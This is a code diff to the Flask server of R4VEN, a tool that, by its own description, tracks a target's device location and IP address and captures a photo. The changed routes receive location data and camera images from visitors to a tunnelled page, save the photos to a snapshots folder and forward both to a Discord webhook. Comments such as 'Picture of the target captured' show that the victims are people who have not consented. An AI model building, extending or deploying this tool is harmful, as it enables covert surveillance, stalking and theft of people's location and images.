@@ -10,14 +10,13 @@ import argparse
 import re
 import time
 from flaredantic import FlareTunnel, FlareConfig
-from flask import Flask, request, Response, send_from_directory
+from flask import Flask, request, Response, send_from_directory, render_template
 import signal
 from utils import get_file_data, update_webhook, check_and_get_webhook_url
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
-
-HTML_FILE_NAME = "index.html"
+user_choice = None
 
 if sys.stdout.isatty():
     R = '\033[31m'  # Red
@@ -30,7 +29,7 @@ if sys.stdout.isatty():
 else:
     R = G = C = W = Y = M = B = ''
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='templates', static_folder='static')
 
 parser = argparse.ArgumentParser(
     description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
@@ -49,21 +48,12 @@ def should_exclude_line(line):
 
 @app.route("/", methods=["GET"])
 def get_website():
-    html_data = ""
-    try:
-        html_data = get_file_data(HTML_FILE_NAME)
-    except FileNotFoundError:
-        pass
-    return Response(html_data, content_type="text/html")
-
-@app.route("/dwebhook.js", methods=["GET"])
-def get_webhook_js():
-    return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)
+    return render_template("index.html", choice=user_choice)
 
 @app.route("/location_update", methods=["POST"])
 def update_location():
     data = request.json
-    discord_webhook = check_and_get_webhook_url(os.getcwd())
+    discord_webhook = check_and_get_webhook_url()
     update_webhook(discord_webhook, data)
     return "OK"
 
@@ -71,12 +61,16 @@ def update_location():
 def image():
     i = request.files['image']
     f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    i.save('%s/%s' % (os.getcwd(), f))
+    if not os.path.exists("snapshots"):
+        os.makedirs("snapshots")
+    image_path = os.path.join("snapshots", f)
+    i.save(image_path)
     #print(f"{B}[+] {C}Picture of the target captured and saved")
 
-    webhook_url = check_and_get_webhook_url(os.getcwd())
-    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
-    response = requests.post(webhook_url, files=files)
+    webhook_url = check_and_get_webhook_url()
+    with open(image_path, 'rb') as f:
+        files = {'image': f}
+        response = requests.post(webhook_url, files=files)
 
     return Response("%s saved and sent to Discord webhook" % f)
 
@@ -84,14 +78,14 @@ def image():
 def get_url():
     return args.target
 
-#run_flask function to handle threading
-def run_flask(folder_name):
-    try:
-        os.chdir(folder_name)
-    except FileNotFoundError:
-        print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
-        sys.exit(1)
+@app.route('/static/<path:path>')
+def send_static(path):
+    return send_from_directory('static', path)
 
+#run_flask function to handle threading
+def run_flask(choice):
+    global user_choice
+    user_choice = choice
     # Start Flask in a separate thread
     flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
     flask_thread.daemon = True
